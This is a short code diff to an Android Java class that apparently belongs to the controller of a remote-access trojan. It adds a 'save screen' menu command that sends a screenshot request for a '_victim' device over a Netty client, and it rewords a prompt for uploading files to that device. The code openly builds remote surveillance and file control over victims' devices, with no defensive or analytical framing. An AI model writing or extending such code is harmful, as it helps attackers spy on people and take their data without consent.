@@ -285,6 +285,7 @@ public class FileManagerActivity extends AppCompatActivity {
         menu.add("Вставить");
         menu.add("Обновить");
         menu.add("Закачать");
+        menu.add("Сохранить screen");
         menu.add("Назад");
         return true;
     }
@@ -347,7 +348,14 @@ public class FileManagerActivity extends AppCompatActivity {
                 OpenFileDialog fileDialog = new OpenFileDialog(this, _victim, genDir());
                 fileDialog.show();
 
-                MainActivity.getInstance().showText("Показываем выбор файла...");
+                MainActivity.getInstance().showText("Выберите файл для выгрузки.");
+                break;
+            case "Сохранить screen":
+                if (!isClicked) {
+                    MainActivity.getInstance().showText("Клики не доступны!");
+                    break;
+                }
+                NettyClient.getInstance().sendTakeScreen(_victim, genDir());
                 break;
             case "Назад":
                 if (!isClicked) {
